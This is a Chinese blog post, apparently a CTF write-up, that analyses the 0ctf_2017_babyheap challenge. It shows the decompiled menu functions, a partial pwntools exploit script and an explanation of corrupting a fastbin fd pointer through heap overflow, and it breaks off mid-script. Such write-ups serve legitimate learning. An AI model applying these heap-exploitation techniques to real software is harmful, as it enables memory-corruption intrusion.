@@ -1,0 +1,603 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    UnSortedbinAttack例题分析 | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="UnSortedbin Attack 例题分析参考资料：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;youdiscovered1t&#x2F;p&#x2F;19109746  特别好的一篇文章，很详细！！！ BUUCTF 0ctf_2017_babyheap   123456789int sub_CF4()&#123;  puts(&quot;1. Allocate&quot;);  puts(&quot;2.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UnSortedbinAttack例题分析">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/UnSortedbinAttack%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="UnSortedbin Attack 例题分析参考资料：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;youdiscovered1t&#x2F;p&#x2F;19109746  特别好的一篇文章，很详细！！！ BUUCTF 0ctf_2017_babyheap   123456789int sub_CF4()&#123;  puts(&quot;1. Allocate&quot;);  puts(&quot;2.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773034689075-116906c2-06dc-4521-8bbf-4c47fd1328b1-622730.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773051166296-da5b35e7-3313-44b0-90aa-91d4fa869804-011437.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773034727922-ba7025f5-e65d-4881-8158-8f5543719af4-811106.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773047797036-7b0b5e12-84ea-427b-b1c7-c408bedae438-513773.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773049272868-422be42c-12e3-490e-b665-3056d0c214c8-926101.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773049786290-1e7db3e9-dd58-4c71-8e95-1d07c56b86a4-596987.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773050162961-a3bff7e1-127d-432e-be17-2c5fa016b79d-810865.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773050358788-14dbb9e7-529f-42c3-957b-bf2016a995ae-611300.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773051191912-1976ba11-22d3-4147-bbd0-4116b0d64364-570505.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773051229744-4f001059-f53c-490f-8da9-4127cccab061-903573.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773051441965-68c190e2-087d-49b9-9ee0-a3fec010adea-991409.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773052563737-2c68a72f-5bdc-4bd3-a7c9-2b064cdef6ad-386546.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773052877324-a19ec30e-ed30-445d-8594-d5c0292d7a8a-738661.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773053906683-5e3caf00-a417-4f5e-b62f-14c4dd7210a9-903957.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773054621896-d8212b61-ac4a-40cc-9f3d-28ef8bc75caf-838405.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773054952725-3b1ec6f2-ce95-4504-ba82-25f31f82ccc2-544337.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773055500337-58323d65-9ed3-48e2-91d3-d852dfd0b7ed-881455.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773054621896-d8212b61-ac4a-40cc-9f3d-28ef8bc75caf-139691.webp">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773056156330-9762dbed-46f0-4414-9061-0622f56bb0c0-574851.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773056167297-9ad3f89f-ab15-4640-86bc-179c339e2873-373734.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773056418444-f3a92048-13b6-4271-aa91-c3237fe437a5-941692.png">
+<meta property="article:published_time" content="2026-04-28T11:14:15.333Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.360Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1773034689075-116906c2-06dc-4521-8bbf-4c47fd1328b1-622730.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="UnSortedbinAttack例题分析">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">UnSortedbinAttack例题分析</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UnSortedbin-Attack-%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">UnSortedbin Attack 例题分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-0ctf-2017-babyheap"><span class="toc-number">1.1.</span> <span class="toc-text">BUUCTF 0ctf_2017_babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Allocate"><span class="toc-number">1.1.1.</span> <span class="toc-text">Allocate</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fill"><span class="toc-number">1.1.2.</span> <span class="toc-text">Fill</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Free"><span class="toc-number">1.1.3.</span> <span class="toc-text">Free</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dump"><span class="toc-number">1.1.4.</span> <span class="toc-text">Dump</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-UnSortedbinAttack例题分析" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T11:14:15.333Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="UnSortedbin-Attack-例题分析"><a href="#UnSortedbin-Attack-例题分析" class="headerlink" title="UnSortedbin Attack 例题分析"></a>UnSortedbin Attack 例题分析</h1><p>参考资料：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/youdiscovered1t/p/19109746">https://www.cnblogs.com/youdiscovered1t/p/19109746</a>  特别好的一篇文章，很详细！！！</p>
+<h3 id="BUUCTF-0ctf-2017-babyheap"><a href="#BUUCTF-0ctf-2017-babyheap" class="headerlink" title="BUUCTF 0ctf_2017_babyheap"></a>BUUCTF 0ctf_2017_babyheap</h3><img src="/HFTTC.github.io/images/pwn/1773034689075-116906c2-06dc-4521-8bbf-4c47fd1328b1-622730.png" alt="1773034689075-116906c2-06dc-4521-8bbf-4c47fd1328b1.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<p><img src="/HFTTC.github.io/images/pwn/1773051166296-da5b35e7-3313-44b0-90aa-91d4fa869804-011437.png" alt="1773051166296-da5b35e7-3313-44b0-90aa-91d4fa869804.png" style="max-width: 100%; display: block; margin: 0 auto;"><img src="/HFTTC.github.io/images/pwn/1773034727922-ba7025f5-e65d-4881-8158-8f5543719af4-811106.png" alt="1773034727922-ba7025f5-e65d-4881-8158-8f5543719af4.png" style="max-width: 100%; display: block; margin: 0 auto;"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_CF4()</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">&quot;1. Allocate&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;2. Fill&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;3. Free&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;4. Dump&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> printf(<span class="string">&quot;Command: &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h4><img src="/HFTTC.github.io/images/pwn/1773047797036-7b0b5e12-84ea-427b-b1c7-c408bedae438-513773.png" alt="1773047797036-7b0b5e12-84ea-427b-b1c7-c408bedae438.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<p>先遍历 16 个索引，寻找到第一个未在使用的索引，读取用户输入的数据大小，要求小于 4096 个字节</p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">分配内存：calloc(j,1) &#x3D; 分配 j 字节，且自动初始化为0（区别于malloc）</font> v3 <font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">&#x3D;calloc ( </font>j<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">, 1u ) ;</font></p>
+<p>if ( !*(_DWORD *)(24LL * i + a1) )：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">24</span> 分别指的是 </span><br><span class="line">[ <span class="number">1.</span> *(_DWORD *)(24LL * i + a1) = <span class="number">1</span>; ]               // “<span class="number">1</span>”表示正在使用中</span><br><span class="line">[ <span class="number">2.</span> *(_QWORD *)(a1 + 24LL * i + <span class="number">8</span>) = j; ]           // 申请chunk的大小 </span><br><span class="line">[ <span class="number">3.</span> *(_QWORD *)(a1 + 24LL * i + <span class="number">16</span>) = v3; ]         // 这里用于存放用户数据的地址</span><br><span class="line">DWORD 在 <span class="number">0x4</span>-<span class="number">0x7</span> 进行四字节填充，剩下的进行 <span class="number">8</span> 字节栈对齐。</span><br><span class="line">一共是三个部分，每个部分是 <span class="number">8</span> 个字节，一共 <span class="number">24</span> 个字节的大小。</span><br></pre></td></tr></table></figure>
+
+<h4 id="Fill"><a href="#Fill" class="headerlink" title="Fill"></a>Fill</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_E7F(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 i; // rax</span><br><span class="line">  <span class="built_in">int</span> n0x10_1; // [rsp+18h] [rbp-8h]</span><br><span class="line">  <span class="built_in">int</span> n0x10_2; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  i = sub_138C();</span><br><span class="line">  n0x10_1 = i;</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned <span class="built_in">int</span>)i &lt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    i = *(unsigned <span class="built_in">int</span> *)(24LL * (<span class="built_in">int</span>)i + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)i == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      i = sub_138C();</span><br><span class="line">      n0x10_2 = i;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="built_in">int</span>)i &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sub_11B2(*(_QWORD *)(24LL * n0x10_1 + a1 + <span class="number">16</span>), n0x10_2);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这一部分其实不难理解，首先读取用户输入的 index，然后去寻找 index 对应的 chunk。之后进行(_DWORD)i 的判断，如果&#x3D;1 就可以进行信息的输入sub_11B2(*(_QWORD *)(24LL * n0x10_1 + a1 + 16), n0x10_2);</p>
+<img src="/HFTTC.github.io/images/pwn/1773049272868-422be42c-12e3-490e-b665-3056d0c214c8-926101.png" alt="1773049272868-422be42c-12e3-490e-b665-3056d0c214c8.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<p>看一下 sub_11B2，该函数就相当于 read 函数，可以读取信息放入到（24LL * n0x10_1 + a1 + 16） 当中，</p>
+<p>也就是存放数据的 user_data 处。</p>
+<h4 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h4><img src="/HFTTC.github.io/images/pwn/1773049786290-1e7db3e9-dd58-4c71-8e95-1d07c56b86a4-596987.png" alt="1773049786290-1e7db3e9-dd58-4c71-8e95-1d07c56b86a4.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<p>这一部分也就是分别对前面说的三个区域置 0，并且 free 掉我们的 chunk</p>
+<h4 id="Dump"><a href="#Dump" class="headerlink" title="Dump"></a>Dump</h4><p><img src="/HFTTC.github.io/images/pwn/1773050162961-a3bff7e1-127d-432e-be17-2c5fa016b79d-810865.png" alt="1773050162961-a3bff7e1-127d-432e-be17-2c5fa016b79d.png" style="max-width: 100%; display: block; margin: 0 auto;"><img src="/HFTTC.github.io/images/pwn/1773050358788-14dbb9e7-529f-42c3-957b-bf2016a995ae-611300.png" alt="1773050358788-14dbb9e7-529f-42c3-957b-bf2016a995ae.png" style="max-width: 100%; display: block; margin: 0 auto;"></p>
+<p>输出程序，把对应索引的 user_data 存入的数据都打印出来。</p>
+<p>攻击思路：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./unsortedbin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">p,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">p,index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">p,index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">p,index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 0 </span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 1</span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 2</span></span><br><span class="line">    allocate(p,<span class="number">0x10</span>) <span class="comment"># chunk 3</span></span><br><span class="line">    allocate(p,<span class="number">0x80</span>) <span class="comment"># chunk 4</span></span><br><span class="line"></span><br><span class="line">    free(p,<span class="number">1</span>)</span><br><span class="line">    free(p,<span class="number">2</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/images/pwn/1773051191912-1976ba11-22d3-4147-bbd0-4116b0d64364-570505.png" alt="1773051191912-1976ba11-22d3-4147-bbd0-4116b0d64364.png" style="max-width: 100%; display: block; margin: 0 auto;"><img src="/HFTTC.github.io/images/pwn/1773051229744-4f001059-f53c-490f-8da9-4127cccab061-903573.png" alt="1773051229744-4f001059-f53c-490f-8da9-4127cccab061.png" style="max-width: 100%; display: block; margin: 0 auto;"></p>
+<p>此时 fastbin 当中会存在两个链表 chunk2 -&gt;chunk1,我们看一下此时的 chunk</p>
+<img src="/HFTTC.github.io/images/pwn/1773051441965-68c190e2-087d-49b9-9ee0-a3fec010adea-991409.png" alt="1773051441965-68c190e2-087d-49b9-9ee0-a3fec010adea.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<p>此时 chunk2 的 fd 指针指向了 chunk1，在0x55be3471c050 的地址中存放着 chunk1 的地址。</p>
+<p>我们可以通过堆溢出去进行堆 chunk2 当中的 fd 指针进行修改，让他指向 chunk4</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span 